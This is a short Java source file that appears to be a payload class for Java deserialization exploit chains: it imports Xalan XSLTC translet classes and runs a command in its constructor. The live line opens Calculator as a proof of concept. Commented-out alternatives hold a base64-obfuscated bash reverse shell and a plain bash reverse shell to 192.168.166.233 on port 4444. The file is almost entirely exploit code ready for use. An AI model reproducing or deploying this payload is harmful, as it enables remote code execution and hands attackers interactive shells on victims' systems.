import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class AttackThatShit {
    public AttackThatShit() {
        try {
//            Runtime.getRuntime().exec("touch /tmp/sususu.txt");
            Runtime.getRuntime().exec("open -a Calculator");
//            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}");

//            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.166.233/4444 0>&1"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        AttackThatShit thatShit = new AttackThatShit();
    }

}
